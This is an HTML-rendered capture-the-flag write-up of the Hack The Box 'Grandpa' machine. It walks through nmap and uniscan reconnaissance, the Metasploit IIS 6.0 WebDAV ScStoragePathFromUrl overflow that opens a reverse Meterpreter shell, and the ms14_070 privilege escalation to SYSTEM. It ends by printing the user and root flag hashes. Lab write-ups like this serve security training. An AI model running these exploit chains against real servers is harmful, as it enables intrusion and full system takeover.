@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Grandpa Write-Up</title>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        
+    </head>
+    <body class="vscode-light">
+        <h1 id="grandpa-write-up">Grandpa Write-Up</h1>
+<p>Machine IP - 10.10.10.14</p>
+<h3 id="inital-phase">Inital Phase</h3>
+<p>Starting with an nmap scan, we get the following results -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/grandpa# nmap -sC -p- -T5 10.10.10.14
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-09 18:09 +04
+Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 14.09% done; ETC: 18:14 (0:04:34 remaining)
+Nmap scan report for 10.10.10.14
+Host is up (0.23s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods:
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-title: Under Construction
+| http-webdav-scan:
+|   Server Type: Microsoft-IIS/6.0
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   WebDAV type: Unkown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Date: Thu, 09 May 2019 14:06:51 GMT
+Nmap done: 1 IP address (1 host up) scanned in 175.82 seconds
+</div></code></code></pre>
+<p>A simultaneous scan on the directory buster reveals the following -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/grandpa# uniscan -qweu http://10.10.10.14/
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+Scan date: 9-5-2019 18:9:52
+===================================================================================================
+| Domain: http://10.10.10.14/
+| Server: Microsoft-IIS/6.0
+| IP: 10.10.10.14
+===================================================================================================
+| Directory check:
+===================================================================================================
+| File check:
+| [+] CODE: 200 URL: http://10.10.10.14/postinfo.html
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_bin/shtml.exe
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_bin/shtml.exe/junk_nonexistant.exe
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_bin/shtml.exe/_vti_rpc
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_bin/shtml.dll/_vti_rpc
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_bin/_vti_adm/admin.dll
+| [+] CODE: 200 URL: http://10.10.10.14/_vti_inf.html
+===================================================================================================
+| Check robots.txt:
+| Check sitemap.xml:
+===================================================================================================
+===================================================================================================
+Scan end date: 9-5-2019 18:13:22
+HTML report saved in: report/10.10.10.14.html
+</div></code></code></pre>
+<p>Looking at the directories and the nmap result, we see that the box is similar to granny, but on testing the PUT requests like in granny, the attempt fails as the main directory isn't writeable or in other words, the webdav is incomplete. Therefore, we can try to find a more suitable directory or we can proceed with other known exploits.</p>
+<h3 id="exploit-phase">Exploit Phase</h3>
+<p>Now, we can try searching on google for exploits and the one that turns up as a latest result as well as a matched result for the terms &quot;webdav iis 6.0 windows exploit&quot; is the <code>Microsoft IIS WebDav ScStoragePathFromUrl Overflow</code>. This also has a metasploit module associated with it, therefore, trying that -</p>
+<pre><code><code><div>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set rhost 10.10.10.14
+rhost =&gt; 10.10.10.14
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set lhost tun0
+lhost =&gt; tun0
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set lport 12345
+lport =&gt; 12345
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit
+[*] Started reverse TCP handler on 10.10.14.68:12345
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (179779 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.14.68:12345 -&gt; 10.10.10.14:1030) at 2019-05-10 13:21:30 +0400
+
+meterpreter &gt;
+meterpreter &gt; sysinfo
+Computer        : GRANPA
+OS              : Windows .NET Server (Build 3790, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter &gt; getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+</div></code></code></pre>
+<p>We get a shell directly, but upon checking the permission that we have, we get an error of stdapi_sys_config_getuid for access denied. We can try to first migrate to a new process and obtaining a new token as follows -</p>
+<pre><code><code><div>meterpreter &gt; ps
+Process List
+============
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 276   4     smss.exe                                                        
+ 324   276   csrss.exe                                                       
+ 348   276   winlogon.exe                                                    
+ 396   348   services.exe                                                    
+ 408   348   lsass.exe                                                       
+ 584   396   svchost.exe                                                     
+ 672   396   svchost.exe                                                     
+ 736   396   svchost.exe                                                     
+ 760   396   svchost.exe                                                     
+ 796   396   svchost.exe                                                     
+ 932   396   spoolsv.exe                                                     
+ 960   396   msdtc.exe                                                       
+ 1080  396   cisvc.exe                                                       
+ 1120  396   svchost.exe                                                     
+ 1176  396   inetinfo.exe                                                    
+ 1216  396   svchost.exe                                                     
+ 1312  396   VGAuthService.exe                                               
+ 1400  396   vmtoolsd.exe                                                    
+ 1452  396   svchost.exe                                                     
+ 1612  396   svchost.exe                                                     
+ 1732  1080  cidaemon.exe                                                    
+ 1780  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1796  396   alg.exe                                                         
+ 1852  396   dllhost.exe                                                     
+ 2160  1080  cidaemon.exe                                                    
+ 2260  1080  cidaemon.exe                                                    
+ 2276  584   wmiprvse.exe                                                    
+ 2636  1452  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2704  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2888  348   logon.scr                                                       
+ 3200  2636  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+meterpreter &gt; migrate 2704
+[*] Migrating from 3200 to 2704...
+[*] Migration completed successfully.
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+</div></code></code></pre>
+<p>Now that we get a starting privilege, we can look for escalations now. Since the system is an x86 windows, we can use the exploit suggester with high accuracy. Therefore, proceeding -</p>
+<pre><code><code><div>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 29 exploit checks are being tried...
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+</div></code></code></pre>
+<p>Now, we can try the exploits one by one. Mainly looking at the ones where the suggester says &quot; target appears to be vulnerable&quot; -</p>
+<pre><code><code><div>meterpreter &gt; background
+[*] Backgrounding session 2...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use exploit/windows/local/ms14_058_track_popup_menu
+msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; set SESSION 2
+SESSION =&gt; 2
+msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; set lhost tun0
+lhost =&gt; tun0
+msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; exploit
+[*] Started reverse TCP handler on 10.10.14.68:4444
+[*] Launching notepad to host the exploit...
+[+] Process 3680 launched.
+[*] Reflectively injecting the exploit DLL into 3680...
+[*] Injecting exploit into 3680...
+[*] Exploit injected. Injecting payload into 3680...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; use exploit/windows/local/ms14_070_tcpip_ioctl
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &gt; set SESSION 2
+SESSION =&gt; 2
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &gt; set lhost tun0
+lhost =&gt; tun0
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &gt; set lport 11223
+lport =&gt; 11223
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &gt; exploit
+[*] Started reverse TCP handler on 10.10.14.68:11223
+[*] Storing the shellcode in memory...
+[*] Triggering the vulnerability...
+[*] Checking privileges after exploitation...
+[+] Exploitation successful!
+[*] Sending stage (179779 bytes) to 10.10.10.14
+[*] Meterpreter session 3 opened (10.10.14.68:11223 -&gt; 10.10.10.14:1032) at 2019-05-10 13:33:07 +0400
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; pwd
+C:\WINDOWS\system32
+meterpreter &gt; cd ../..
+meterpreter &gt; cd &quot;Documents and Settings&quot;
+meterpreter &gt; dir
+Listing: C:\Documents and Settings
+==================================
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-04-12 18:12:15 +0400  Administrator
+40777/rwxrwxrwx  0     dir   2017-04-12 17:42:38 +0400  All Users
+40777/rwxrwxrwx  0     dir   2017-04-12 17:42:38 +0400  Default User
+40777/rwxrwxrwx  0     dir   2017-04-12 18:32:01 +0400  Harry
+40777/rwxrwxrwx  0     dir   2017-04-12 18:08:32 +0400  LocalService
+40777/rwxrwxrwx  0     dir   2017-04-12 18:08:31 +0400  NetworkService
+meterpreter &gt; cd Harry
+meterpreter &gt; cd Desktop
+meterpreter &gt; ls
+Listing: C:\Documents and Settings\Harry\Desktop
+================================================
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 18:32:09 +0400  user.txt
+meterpreter &gt; cat user.txt
+bdff5ec67c3cff017f2bedc146a5d869meterpreter &gt; cd ../..
+meterpreter &gt; cd Administrator
+meterpreter &gt; cd Desktop
+meterpreter &gt; ls
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 18:28:50 +0400  root.txt
+meterpreter &gt; cat root.txt
+9359e905a2c35f861f6a57cecf28bb7b
+</div></code></code></pre>
+<p>Thus, the intended exploit here was 'ms14_070_tcpip_ioctl', which grants the root shell. Thus, we get the user and root flags.</p>
+
+    </body>
+    </html>
